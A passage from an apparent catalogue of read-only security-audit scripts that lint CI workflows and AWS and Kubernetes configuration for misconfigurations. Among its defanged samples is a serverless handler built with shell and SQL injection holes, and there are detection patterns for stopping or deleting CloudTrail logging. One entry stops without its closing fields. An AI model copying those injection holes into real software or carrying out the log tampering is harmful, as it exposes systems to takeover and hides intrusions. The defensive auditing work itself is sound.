IA-kerberos-ticket.safety: No ticket is forged by this artifact -- it is a documented public-tool reference (FAKE hashes/SIDs, lab.example.test) plus a pure detection/hunt harness, confined to an isolated owned test forest.

XC-ppe-pipeline-exec.name: Poisoned Pipeline Execution (PPE) lint of pull_request-triggered jobs
XC-ppe-pipeline-exec.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
XC-ppe-pipeline-exec.setup: python3 (stdlib only). Point at a repo's .github/workflows directory you OWN. Falls back to a bundled DEFANGED sample workflow if none found. READ-ONLY static lint of YAML text.
XC-ppe-pipeline-exec.script:
#!/usr/bin/env python3
# XC-ppe-pipeline-exec: static lint for Poisoned Pipeline Execution.
# Flags pull_request / pull_request_target jobs that run repo-controlled scripts
# (checked-out code, make, npm scripts) WHILE secrets are in scope. READ-ONLY.
import os, re, sys, glob

SAMPLE = '''# DEFANGED sample (example.test)
name: ci
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      DEPLOY_TOKEN: FAKE-TOKEN
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm run build
'''

def load_workflows():
    files = []
    for root in ('.github/workflows', os.path.expanduser('~/.github/workflows')):
        files += glob.glob(os.path.join(root, '*.y*ml'))
    docs = []
    for f in files:
        try:
            docs.append((f, open(f, encoding='utf-8', errors='replace').read()))
        except OSError:
            pass
    if not docs:
        docs = [('<bundled-sample>', SAMPLE)]
    return docs

DANGEROUS_TRIGGER = re.compile(r'^\s*(pull_request_target|pull_request)\s*:', re.M)
CHECKOUT_HEAD = re.compile(r'pull_request\.head|github\.head_ref|event\.pull_request', re.I)
RUN_SCRIPT = re.compile(r'^\s*-?\s*run:\s*.*(npm|yarn|pnpm|make|bash|sh |python|./|setup.py|gradle)', re.I | re.M)
SECRET_REF = re.compile(r'secrets\.[A-Z0-9_]+|env:\s', re.I)

findings = []
for name, text in load_workflows():
    has_pr = DANGEROUS_TRIGGER.search(text)
    if not has_pr:
        continue
    trig = has_pr.group(1)
    runs_repo_code = bool(RUN_SCRIPT.search(text))
    checks_out_head = bool(CHECKOUT_HEAD.search(text))
    has_secret = bool(SECRET_REF.search(text))
    risky = runs_repo_code and (has_secret or trig == 'pull_request_target')
    findings.append((name, trig, runs_repo_code, checks_out_head, has_secret, risky))

print('=== PPE pipeline-exec lint ===')
vuln = False
for name, trig, code, head, secret, risky in findings:
    print(f'  [{name}] trigger={trig} runs_repo_script={code} checks_out_PR_head={head} secrets_in_scope={secret}')
    if risky:
        vuln = True
        print('    VULNERABLE: untrusted PR code executes with secrets/elevated context (PPE). '
              'Use pull_request (not _target) for untrusted code, gate with environments + required reviewers, '
              'never checkout PR head into a secret-bearing job.')
if not findings:
    print('PASS: no pull_request-triggered jobs found.')
elif not vuln:
    print('PASS: PR-triggered jobs do not combine untrusted code execution with secrets.')
sys.exit(2 if vuln else 0)
XC-ppe-pipeline-exec.success_criterion: A pull_request_target (or pull_request) job that runs repo-controlled scripts (npm/make/bash) while secrets/env are in scope -> 'VULNERABLE'. Confirms the PPE seam where a forked PR's code runs in a privileged, secret-bearing context.
XC-ppe-pipeline-exec.safety: Read-only: parses YAML text only; never executes pipeline steps, never mutates the repo or CI config.

XC-ci-secret-oidc-exfil.name: CI OIDC subject/audience scoping + fork secret-exposure audit
XC-ci-secret-oidc-exfil.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
XC-ci-secret-oidc-exfil.setup: python3 (stdlib). Audits a workflow YAML you OWN plus a DEFANGED sample cloud trust policy. READ-ONLY: parses OIDC claim usage and trust-policy 'sub' conditions; no token minting, no AssumeRole.
XC-ci-secret-oidc-exfil.script:
#!/usr/bin/env python3
# XC-ci-secret-oidc-exfil: audit OIDC sub/audience scoping and secret exposure to forks.
# READ-ONLY static check. Defanged identifiers.
import re, sys

WORKFLOW = '''# DEFANGED workflow sample
name: deploy
on:
  pull_request: {}
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      PROD_SECRET: FAKE-TOKEN
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/ci-deploy
          aud: sts.amazonaws.com
'''

# DEFANGED cloud trust policy that the OIDC token is exchanged against
TRUST_POLICY = {
  'sub_condition': 'repo:example-org/*:*',   # overly broad: any repo/branch/PR
  'aud_condition': 'sts.amazonaws.com'
}

def has(p, t):
    return bool(re.search(p, t, re.I | re.M))

vuln = False
print('=== OIDC scoping + fork secret-exposure audit ===')

# 1) id-token write granted on a fork-reachable trigger
if has(r'id-token:\s*write', WORKFLOW) and has(r'^\s*pull_request\b', WORKFLOW):
    print('  [workflow] id-token:write present on a pull_request trigger.')
    if has(r'secrets\.|FAKE-TOKEN|_SECRET', WORKFLOW):
        vuln = True
        print('    VULNERABLE: secrets + OIDC id-token available on a fork-reachable trigger; '
              'a malicious PR can mint a cloud token / read secrets.')

# 2) trust-policy sub claim too broad
sub = TRUST_POLICY.get('sub_condition', '')
if re.search(r':\*$|/\*:|^repo:[^:]+:\*$|\*', sub):
    vuln = True
    print(f'  [trust-policy] sub condition is broad: {sub!r}')
    print('    VULNERABLE: OIDC sub not pinned to a specific repo+ref (e.g. repo:org/repo:ref:refs/heads/main). '
          'Any branch/PR/fork workflow can assume the role.')
else:
    print(f'  [trust-policy] sub condition pinned: {sub!r}')

# 3) audience present
if not TRUST_POLICY.get('aud_condition'):
    vuln = True
    print('    VULNERABLE: no audience (aud) condition on the trust policy.')
else:
    print(f'  [trust-policy] aud condition set: {TRUST_POLICY["aud_condition"]!r}')

print('PASS' if not vuln else 'VULNERABLE (see above)')
sys.exit(2 if vuln else 0)
XC-ci-secret-oidc-exfil.success_criterion: OIDC id-token:write on a fork-reachable trigger with secrets in scope, OR a trust-policy 'sub' condition wildcarded to any repo/ref -> 'VULNERABLE'. Confirms the seam where a fork can mint cloud creds or read secrets.
XC-ci-secret-oidc-exfil.safety: Read-only: parses workflow + trust-policy text only; mints no tokens and performs no AssumeRole.

XC-runner-takeover-cache-poison.name: Self-hosted runner on public repo + cache-poison surface audit
XC-runner-takeover-cache-poison.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
XC-runner-takeover-cache-poison.setup: bash + python3 (stdlib) + optionally gh CLI authenticated to an OWNED org. Without gh, runs against a DEFANGED sample workflow/runner config. READ-ONLY: list/get only.
XC-runner-takeover-cache-poison.script:
#!/usr/bin/env bash
# XC-runner-takeover-cache-poison: flag self-hosted runners attached to PUBLIC repos
# (untrusted PRs can run on persistent infra) and cache restore-without-scope (cache poisoning).
# READ-ONLY config audit. Defanged sample if gh not present.
set -u
VULN=0
echo '=== self-hosted runner + cache-poison audit ==='

# DEFANGED sample workflow
SAMPLE_WF=$(cat <<'YAML'
on: [pull_request]
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/cache@v4
        with:
          path: ~/.cache
          key: build-${{ github.sha }}
          restore-keys: |
            build-
YAML
)

# Repo visibility (try gh on an OWNED repo, else assume public sample)
VIS='public'
if command -v gh >/dev/null 2>&1 && [ -n "${OWNED_REPO:-}" ]; then
  VIS=$(gh repo view "$OWNED_REPO" --json visibility -q .visibility 2>/dev/null || echo public)
fi
echo "  repo visibility: ${VIS}"

echo "$SAMPLE_WF" | grep -qE 'self-hosted' && SELF=1 || SELF=0
echo "$SAMPLE_WF" | grep -qE '^\s*pull_request|\[pull_request\]|\[ *pull_request' && PR=1 || PR=0
echo "  self-hosted runner used: ${SELF}    pull_request trigger: ${PR}"

if [ "$SELF" = 1 ] && [ "$PR" = 1 ] && [ "$VIS" = public ]; then
  echo '  VULNERABLE: self-hosted runner executes untrusted PR code on a PUBLIC repo -> runner takeover / persistence. Use ephemeral runners (just-in-time), require approval for fork PRs, isolate runner per job.'
  VULN=1
fi

# cache poisoning: broad restore-keys lets a PR write a cache entry a trusted branch later restores
if echo "$SAMPLE_WF" | grep -qE 'restore-keys'; then
  echo "$SAMPLE_WF" | grep -A2 'restore-keys' | grep -qE 'build-$|^\s*[a-z]+-$' && {
    echo '  VULNERABLE: broad restore-keys prefix lets a PR-scoped cache entry be restored by trusted runs (cache poisoning). Scope cache keys to ref, disable cross-ref restore.'
    VULN=1
  }
fi

[ "$VULN" = 0 ] && echo 'PASS: no self-hosted+public+PR combo and no broad cache restore-keys.'
exit $VULN
XC-runner-takeover-cache-poison.success_criterion: A self-hosted runner running pull_request jobs on a public repo, OR broad cache restore-keys -> 'VULNERABLE'. Confirms the runner-takeover / cache-poisoning seam.
XC-runner-takeover-cache-poison.safety: Read-only: gh repo view / config text parsing only; never registers a runner, never writes a cache entry.

XC-artifact-tag-mutation.name: Container registry tag immutability audit
XC-artifact-tag-mutation.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
XC-artifact-tag-mutation.setup: bash + jq + aws CLI (ECR) authenticated to an OWNED account, OR runs against a DEFANGED sample JSON. READ-ONLY: describe-repositories only.
XC-artifact-tag-mutation.script:
#!/usr/bin/env bash
# XC-artifact-tag-mutation: audit whether registry repos allow tag mutation
# (mutable tags let an attacker re-point :latest/:v1 to a malicious digest). READ-ONLY.
set -u
VULN=0
echo '=== registry tag-immutability audit ==='

get_repos() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    aws ecr describe-repositories --output json 2>/dev/null
  else
    # DEFANGED sample
    cat <<'JSON'
{"repositories":[
  {"repositoryName":"app-frontend","imageTagMutability":"MUTABLE","repositoryUri":"ACCOUNT_ID.dkr.ecr.us-east-1.amazonaws.com/app-frontend"},
  {"repositoryName":"app-api","imageTagMutability":"IMMUTABLE","repositoryUri":"ACCOUNT_ID.dkr.ecr.us-east-1.amazonaws.com/app-api"}
]}
JSON
  fi
}

DATA=$(get_repos)
echo "$DATA" | jq -r '.repositories[] | "\(.repositoryName)\t\(.imageTagMutability)"' | while IFS=$'\t' read -r name mut; do
  echo "  ${name}: ${mut}"
done

if echo "$DATA" | jq -e '.repositories[] | select(.imageTagMutability=="MUTABLE")' >/dev/null 2>&1; then
  echo '  VULNERABLE: one or more repositories allow MUTABLE tags -> an attacker with push can re-point an existing tag (e.g. :v1.2.3) to a malicious image digest. Set imageTagMutability=IMMUTABLE and pin deployments by digest.'
  VULN=1
else
  echo 'PASS: all repositories enforce IMMUTABLE tags.'
fi
exit $VULN
XC-artifact-tag-mutation.success_criterion: Any repository with imageTagMutability=MUTABLE -> 'VULNERABLE'. Confirms the artifact-tag-mutation seam where a pushed tag can be silently re-pointed to a malicious digest.
XC-artifact-tag-mutation.safety: Read-only: describe-repositories only; never pushes, tags, or deletes images.

CO-cross-account-confused-deputy.name: Cross-account IAM trust-policy ExternalId / confused-deputy audit
CO-cross-account-confused-deputy.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-cross-account-confused-deputy.setup: bash + jq + aws CLI on an OWNED account (iam:GetRole/ListRoles), OR DEFANGED sample trust policies. READ-ONLY: get-role only.
CO-cross-account-confused-deputy.script:
#!/usr/bin/env bash
# CO-cross-account-confused-deputy: audit cross-account AssumeRole trust policies
# for missing or guessable ExternalId (confused-deputy). READ-ONLY get/describe.
set -u
VULN=0
echo '=== cross-account trust-policy confused-deputy audit ==='

get_policies() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    aws iam list-roles --output json 2>/dev/null | jq -c '.Roles[] | {name:.RoleName, doc:.AssumeRolePolicyDocument}'
  else
    cat <<'JSON'
{"name":"vendor-integration","doc":{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999988887777:root"},"Action":"sts:AssumeRole"}]}}
{"name":"backup-saas","doc":{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999988887777:root"},"Action":"sts:AssumeRole","Condition":{"StringEquals":{"sts:ExternalId":"FAKE-EXTERNAL-ID-7f3a"}}}]}}
JSON
  fi
}

get_policies | while read -r line; do
  NAME=$(echo "$line" | jq -r '.name')
  # cross-account principal present?
  CROSS=$(echo "$line" | jq -r '[.doc.Statement[]?|select(.Principal.AWS!=null)]|length')
  HASEXT=$(echo "$line" | jq -r '[.doc.Statement[]?|select(.Condition.StringEquals."sts:ExternalId"!=null or .Condition.StringLike."sts:ExternalId"!=null)]|length')
  if [ "$CROSS" -gt 0 ] && [ "$HASEXT" -eq 0 ]; then
    echo "  ${NAME}: cross-account trust WITHOUT ExternalId condition"
    echo '    VULNERABLE: third party can be tricked into assuming this role on an attacker behalf (confused deputy). Require a secret sts:ExternalId condition.'
  else
    echo "  ${NAME}: cross=${CROSS} externalId_conditions=${HASEXT} (ok)"
  fi
done

# exit code derived from a second pass (subshell scoping)
if get_policies | jq -e 'select((.doc.Statement[]?|select(.Principal.AWS!=null)) and (([.doc.Statement[]?|select(.Condition.StringEquals."sts:ExternalId"!=null)]|length)==0))' >/dev/null 2>&1; then VULN=1; fi
[ "$VULN" = 0 ] && echo 'PASS: all cross-account trusts require ExternalId.' || echo 'VULNERABLE: see roles above.'
exit $VULN
CO-cross-account-confused-deputy.success_criterion: A role trusting an external AWS account principal with no sts:ExternalId condition -> 'VULNERABLE'. Confirms the confused-deputy seam.
CO-cross-account-confused-deputy.safety: Read-only: list-roles/get-role only; never edits trust policies or assumes any role.

CO-object-store-acl-default.name: Object-store bucket public-access / ACL audit
CO-object-store-acl-default.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-object-store-acl-default.setup: bash + jq + aws CLI on OWNED account (s3api get-bucket-acl / get-public-access-block), OR DEFANGED sample. READ-ONLY: get/list only.
CO-object-store-acl-default.script:
#!/usr/bin/env bash
# CO-object-store-acl-default: audit OWNED buckets for public ACLs / missing public-access-block.
# READ-ONLY get-bucket-acl + get-public-access-block. No cross-tenant probing.
set -u
VULN=0
echo '=== object-store public-access audit ==='

list_buckets() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null
  else
    echo 'owned-public-assets owned-private-data'
  fi
}

audit_bucket() {
  local b="$1"
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    PAB=$(aws s3api get-public-access-block --bucket "$b" --output json 2>/dev/null)
    ACL=$(aws s3api get-bucket-acl --bucket "$b" --output json 2>/dev/null)
  else
    if [ "$b" = owned-public-assets ]; then
      PAB='{"PublicAccessBlockConfiguration":{"BlockPublicAcls":false,"IgnorePublicAcls":false,"BlockPublicPolicy":false,"RestrictPublicBuckets":false}}'
      ACL='{"Grants":[{"Grantee":{"URI":"http://acs.amazonaws.com/groups/global/AllUsers"},"Permission":"READ"}]}'
    else
      PAB='{"PublicAccessBlockConfiguration":{"BlockPublicAcls":true,"IgnorePublicAcls":true,"BlockPublicPolicy":true,"RestrictPublicBuckets":true}}'
      ACL='{"Grants":[{"Grantee":{"Type":"CanonicalUser"},"Permission":"FULL_CONTROL"}]}'
    fi
  fi
  local pub_acl block_all
  pub_acl=$(echo "$ACL" | jq -r '[.Grants[]?|select(.Grantee.URI|test("AllUsers|AuthenticatedUsers")?//false)]|length' 2>/dev/null || echo 0)
  block_all=$(echo "$PAB" | jq -r '.PublicAccessBlockConfiguration|(.BlockPublicAcls and .IgnorePublicAcls and .BlockPublicPolicy and .RestrictPublicBuckets)' 2>/dev/null || echo false)
  echo "  ${b}: public_acl_grants=${pub_acl} public_access_block_all=${block_all}"
  if [ "${pub_acl:-0}" -gt 0 ] || [ "$block_all" != true ]; then
    echo '    VULNERABLE: bucket exposes a public ACL grant and/or does not fully block public access. Enable all 4 BlockPublicAccess settings.'
    return 1
  fi
  return 0
}

for b in $(list_buckets); do audit_bucket "$b" || VULN=1; done
[ "$VULN" = 0 ] && echo 'PASS: all owned buckets block public access and have no AllUsers/AuthenticatedUsers grants.' || echo 'VULNERABLE: see buckets above.'
exit $VULN
CO-object-store-acl-default.success_criterion: An owned bucket with an AllUsers/AuthenticatedUsers ACL grant or incomplete public-access-block -> 'VULNERABLE'. Confirms the default-ACL exposure seam.
CO-object-store-acl-default.safety: Read-only: get-bucket-acl / get-public-access-block on owned buckets only; never lists object contents of others, never changes ACLs.

CO-serverless-event-injection.name: Serverless function event-payload trust (injection) static audit
CO-serverless-event-injection.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-serverless-event-injection.setup: python3 (stdlib). Point at a Lambda/function handler source file you OWN, or use the bundled DEFANGED sample. READ-ONLY AST/source scan.
CO-serverless-event-injection.script:
#!/usr/bin/env python3
# CO-serverless-event-injection: static check that a function handler trusts
# event payload fields unsanitized (shell, SQL, path, eval sinks). READ-ONLY.
import ast, sys, os

SAMPLE = '''
import os, subprocess, sqlite3
def handler(event, context):
    name = event["queryStringParameters"]["name"]
    # event field flows straight into a shell command
    subprocess.run("echo " + name, shell=True)
    db = sqlite3.connect("/tmp/x.db")
    db.execute("SELECT * FROM u WHERE n = '" + event["body"] + "'")
    os.system(event["path"])
    return {"statusCode": 200}
'''

path = sys.argv[1] if len(sys.argv) > 1 and os.path.exists(sys.argv[1]) else None
src = open(path, encoding='utf-8', errors='replace').read() if path else SAMPLE
label = path or '<bundled-sample>'

SINKS = {('os','system'),('subprocess','run'),('subprocess','call'),('subprocess','Popen'),
         ('','eval'),('','exec')}
EXEC_KWARG_SHELL = 'shell'

try:
    tree = ast.parse(src)
except SyntaxError as e:
    print(f'PASS (could not parse {label}: {e})'); sys.exit(0)

# crude taint: any Name/Subscript chain rooted at 'event' reaching a sink arg
class V(ast.NodeVisitor):
    def __init__(self): self.hits = []
    def _touches_event(self, node):
        for n in ast.walk(node):
            if isinstance(n, ast.Name) and n.id == 'event':
                return True
        return False
    def visit_Call(self, node):
        fname = ('','')
        f = node.func
        if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
            fname = (f.value.id, f.attr)
        elif isinstance(f, ast.Name):
            fname = ('', f.id)
        shell_true = any(isinstance(k.value, ast.Constant) and k.value.value is True and k.arg==EXEC_KWARG_SHELL for k in node.keywords)
        is_sink = fname in SINKS
        is_sql = isinstance(f, ast.Attribute) and f.attr in ('execute','executemany')
        if (is_sink or is_sql) and any(self._touches_event(a) for a in node.args):
            self.hits.append((getattr(node,'lineno','?'), f'{fname[0]}.{fname[1]}'.strip('.'), shell_true or is_sql))
        self.generic_visit(node)

v = V(); v.visit(tree)
print(f'=== serverless event-injection audit [{label}] ===')
if v.hits:
    for ln, fn, danger in v.hits:
        print(f'  line {ln}: event-derived data flows into sink {fn}() (shell/sql={danger})')
    print('VULNERABLE: untrusted event payload reaches an injection sink unsanitized. Validate/parameterize all event fields; never pass them to shell/SQL/eval.')
    sys.exit(2)
print('PASS: no event-derived data reaches a known injection sink.')
CO-serverless-event-injection.success_criterion: Event-derived data flowing into os.system/subprocess(shell=True)/db.execute/eval without sanitization -> 'VULNERABLE'. Confirms the serverless event-injection seam.
CO-serverless-event-injection.safety: Read-only: parses source into an AST; never invokes the handler or any sink.

CO-longlived-access-key.name: IAM long-lived access-key age audit
CO-longlived-access-key.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-longlived-access-key.setup: bash + jq + aws CLI on OWNED account (iam:ListUsers/ListAccessKeys), OR DEFANGED sample. READ-ONLY: list only.
CO-longlived-access-key.script:
#!/usr/bin/env bash
# CO-longlived-access-key: flag IAM access keys older than a threshold (default 90 days)
# and active keys never rotated. READ-ONLY list-access-keys.
set -u
THRESH_DAYS=${THRESH_DAYS:-90}
VULN=0
NOW=$(date -u +%s)
echo "=== long-lived access-key audit (threshold ${THRESH_DAYS}d) ==="

get_keys() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    for u in $(aws iam list-users --query 'Users[].UserName' --output text 2>/dev/null); do
      aws iam list-access-keys --user-name "$u" --output json 2>/dev/null \
        | jq -c --arg u "$u" '.AccessKeyMetadata[]|{user:$u,id:.AccessKeyId,status:.Status,created:.CreateDate}'
    done
  else
    cat <<'JSON'
{"user":"svc-deploy","id":"AKIAFAKEEXAMPLE001","status":"Active","created":"2021-02-01T00:00:00Z"}
{"user":"alice","id":"AKIAFAKEEXAMPLE002","status":"Active","created":"2026-06-01T00:00:00Z"}
JSON
  fi
}

while read -r line; do
  [ -z "$line" ] && continue
  U=$(echo "$line" | jq -r .user); ID=$(echo "$line" | jq -r .id)
  ST=$(echo "$line" | jq -r .status); CR=$(echo "$line" | jq -r .created)
  CRS=$(date -u -d "$CR" +%s 2>/dev/null || echo "$NOW")
  AGE=$(( (NOW - CRS) / 86400 ))
  echo "  ${U}/${ID}: status=${ST} age=${AGE}d"
  if [ "$ST" = Active ] && [ "$AGE" -ge "$THRESH_DAYS" ]; then
    echo "    VULNERABLE: active access key ${AGE}d old (>= ${THRESH_DAYS}d). Rotate/retire; prefer short-lived roles/OIDC."
    VULN=1
  fi
done < <(get_keys)

[ "$VULN" = 0 ] && echo 'PASS: no active keys exceed the age threshold.' || echo 'VULNERABLE: see keys above.'
exit $VULN
CO-longlived-access-key.success_criterion: An Active access key older than the threshold (default 90 days) -> 'VULNERABLE'. Confirms the long-lived-credential seam.
CO-longlived-access-key.safety: Read-only: list-users / list-access-keys metadata only; never creates, rotates, or deletes keys.

CO-cloud-logging-tamper.name: Cloud audit-log tamper-permission audit (CloudTrail)
CO-cloud-logging-tamper.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-cloud-logging-tamper.setup: bash + jq + aws CLI on OWNED account (cloudtrail:DescribeTrails, iam:GetPolicyVersion), OR DEFANGED sample. READ-ONLY: describe/get only.
CO-cloud-logging-tamper.script:
#!/usr/bin/env bash
# CO-cloud-logging-tamper: detect trails that can be stopped/deleted (no log-file validation,
# not multi-region) and IAM policies that grant StopLogging/DeleteTrail broadly. READ-ONLY.
set -u
VULN=0
echo '=== cloud audit-log tamper audit ==='

get_trails() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    aws cloudtrail describe-trails --output json 2>/dev/null
  else
    cat <<'JSON'
{"trailList":[{"Name":"org-trail","IsMultiRegionTrail":false,"LogFileValidationEnabled":false}]}
JSON
  fi
}

get_perms() {
  # DEFANGED policy doc representing what a role is allowed to do
  cat <<'JSON'
{"Statement":[{"Effect":"Allow","Action":["cloudtrail:StopLogging","cloudtrail:DeleteTrail","cloudtrail:UpdateTrail"],"Resource":"*"}]}
JSON
}

DATA=$(get_trails)
echo "$DATA" | jq -r '.trailList[]? | "  trail \(.Name): multiRegion=\(.IsMultiRegionTrail) logFileValidation=\(.LogFileValidationEnabled)"'
if echo "$DATA" | jq -e '.trailList[]? | select(.LogFileValidationEnabled==false or .IsMultiRegionTrail==false)' >/dev/null 2>&1; then
  echo '    VULNERABLE: trail lacks log-file-validation and/or multi-region coverage -> tampering/gaps go undetected. Enable LogFileValidation + multi-region.'
  VULN=1
fi

PERMS=$(get_perms)
if echo "$PERMS" | jq -e '.Statement[]?|select(.Effect=="Allow" and (.Action|tostring|test("cloudtrail:(StopLogging|DeleteTrail|PutEventSelectors|UpdateTrail)")) and (.Resource=="*"))' >/dev/null 2>&1; then
  echo '  VULNERABLE: a role can StopLogging/DeleteTrail/UpdateTrail on Resource=*. Restrict to break-glass principal, add SCP deny, alarm on these events.'
  VULN=1
else
  echo '  policy: no broad trail-mutation grant detected.'
fi

[ "$VULN" = 0 ] && echo 'PASS: trails are validated+multi-region and no broad tamper permission found.' || echo 'VULNERABLE: see above.'
exit $VULN
CO-cloud-logging-tamper.success_criterion: A trail without log-file-validation/multi-region, OR a policy granting StopLogging/DeleteTrail on Resource=* -> 'VULNERABLE'. Confirms the logging-tamper seam.
CO-cloud-logging-tamper.safety: Read-only: describe-trails / policy-doc parsing only; never stops, deletes, or updates a trail.

CO-imdsv1-token-vs-network.name: IMDSv1 (HttpTokens=optional) instance metadata-options audit
CO-imdsv1-token-vs-network.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-imdsv1-token-vs-network.setup: bash + jq + aws CLI on OWNED account (ec2:DescribeInstances), OR DEFANGED sample. READ-ONLY: describe only. Audits the metadata-options control plane (vs the C-imds runtime mock).
CO-imdsv1-token-vs-network.script:
#!/usr/bin/env bash
# CO-imdsv1-token-vs-network: audit instance metadata-options for HttpTokens=optional (IMDSv1 allowed)
# and a permissive HttpPutResponseHopLimit (network reachable from containers). READ-ONLY describe.
set -u
VULN=0
echo '=== IMDSv1 metadata-options audit ==='

get_md() {
  if command -v aws >/dev/null 2>&1 && aws sts get-caller-identity >/dev/null 2>&1; then
    aws ec2 describe-instances --output json 2>/dev/null \
      | jq -c '.Reservations[].Instances[]|{id:.InstanceId, tokens:.MetadataOptions.HttpTokens, hop:.MetadataOptions.HttpPutResponseHopLimit, endpoint:.MetadataOptions.HttpEndpoint}'
  else
    cat <<'JSON'
{"id":"i-0fakeexample01","tokens":"optional","hop":2,"endpoint":"enabled"}
{"id":"i-0fakeexample02","tokens":"required","hop":1,"endpoint":"enabled"}
JSON
  fi
}

while read -r line; do
  [ -z "$line" ] && continue
  ID=$(echo "$line" | jq -r .id); TOK=$(echo "$line" | jq -r .tokens)
  HOP=$(echo "$line" | jq -r .hop); EP=$(echo "$line" | jq -r .endpoint)
  echo "  ${ID}: HttpTokens=${TOK} HopLimit=${HOP} endpoint=${EP}"
  if [ "$TOK" = optional ]; then
    echo '    VULNERABLE: IMDSv1 allowed (HttpTokens=optional) -> SSRF can read instance role creds without a session token. Set HttpTokens=required.'
    VULN=1
  fi
  if [ "$HOP" -gt 1 ] 2>/dev/null; then
    echo '    VULNERABLE: HttpPutResponseHopLimit>1 -> metadata reachable from pod/container network. Set HopLimit=1.'
    VULN=1
  fi
done < <(get_md)

[ "$VULN" = 0 ] && echo 'PASS: IMDSv2 enforced (HttpTokens=required) with HopLimit=1.' || echo 'VULNERABLE: see instances above.'
exit $VULN
CO-imdsv1-token-vs-network.success_criterion: An instance with HttpTokens=optional or HttpPutResponseHopLimit>1 -> 'VULNERABLE'. Confirms the IMDSv1 / network-reachable-metadata seam at the control plane.
CO-imdsv1-token-vs-network.safety: Read-only: describe-instances metadata-options only; never modifies instance metadata options.

CO-k8s-network-as-authz.name: K8s anonymous-auth / authz reachability audit (auth can-i)
CO-k8s-network-as-authz.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-k8s-network-as-authz.setup: bash + kubectl pointed at an OWNED cluster context, OR DEFANGED sample output. READ-ONLY: kubectl auth can-i --list + config read only.
CO-k8s-network-as-authz.script:
#!/usr/bin/env bash
# CO-k8s-network-as-authz: confirm the cluster relies on RBAC (not network position) for authz.
# Checks anonymous-auth and what an unauthenticated/anonymous subject can do. READ-ONLY.
set -u
VULN=0
echo '=== k8s network-as-authz / anonymous-auth audit ==='

if command -v kubectl >/dev/null 2>&1 && kubectl version --request-timeout=3s >/dev/null 2>&1; then
  echo '  [*] anonymous subject capabilities (system:anonymous):'
  ANON=$(kubectl auth can-i --list --as=system:anonymous 2>/dev/null || echo '')
  echo "$ANON" | sed 's/^/    /'
  UNAUTH=$(kubectl auth can-i get pods --as=system:anonymous 2>/dev/null || echo no)
else
  echo '  [*] kubectl unavailable; using DEFANGED sample'
  ANON=$'Resources  Non-Resource URLs  Resource Names  Verbs\npods       []                  []              [get list]'
  echo "$ANON" | sed 's/^/    /'
  UNAUTH=yes
fi

if echo "$ANON" | grep -qiE '\bget\b|\blist\b|\bcreate\b|\*' && [ "$UNAUTH" = yes ]; then
  echo '  VULNERABLE: anonymous/unauthenticated subject has API verbs -> authz depends on network reachability, not RBAC. Disable --anonymous-auth, bind no roles to system:anonymous/system:unauthenticated.'
  VULN=1
fi

CO-domain-aging-reputation.name: Owned-domain age / registration-recency defender-signal check
CO-domain-aging-reputation.authorization: Authorized assessment of owned/contracted assets only, signed RoE.
CO-domain-aging-reputation.setup: python3 (stdlib socket for WHOIS port 43) on an OWNED domain. Falls back to a DEFANGED offline sample if no network. READ-ONLY passive WHOIS lookup; frames the defender signal an operator would otherwise have to forge.
CO-domain-aging-reputation.script:
#!/usr/bin/env python3
# CO-domain-aging-reputation: passively read the creation date / age of an OWNED domain via WHOIS (port 43).
# This is the DEFENDER-side signal (newly-registered domains are blocked/scrutinized). READ-ONLY.
import sys, socket, re, datetime

DOMAIN = sys.argv[1] if len(sys.argv) > 1 else 'example.test'
WHOIS_HOST = 'whois.iana.test'  # defanged placeholder; real audits use the registry whois server
THRESH_DAYS = 30

def whois(domain):
    # Attempt a real passive WHOIS query against an OWNED domain; offline -> sample.
    for server in ('whois.verisign-grs.com', 'whois.iana.org'):
        try:
            s = socket.create_connection((server, 43), timeout=4)
            s.sendall((domain + '\r\n').encode())
            buf = b''
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                buf += chunk
            s.close()
            txt = buf.decode(errors='replace')
            if 'Creation Date' in txt or 'created' in txt.lower():
                return txt
        except OSError:
            continue
    # DEFANGED offline sample: a freshly-registered domain
    return 'Domain Name: EXAMPLE.TEST\nCreation Date: 2026-06-10T00:00:00Z\nRegistrar: FAKE-REGISTRAR\n'

txt = whois(DOMAIN)
m = re.search(r'(?:Creation Date|created)\s*:?\s*([0-9]{4}-[0-9]{2}-[0-9]{2})', txt, re.I)
print(f'=== domain-aging reputation check [{DOMAIN}] ===')
if not m:
    print('PASS (indeterminate): no creation date parsed.'); sys.exit(0)
created = datetime.date.fromisoformat(m.group(1))
age = (datetime.date.today() - created).days
print(f'  creation date: {created}  age: {age} days')
if age < THRESH_DAYS:
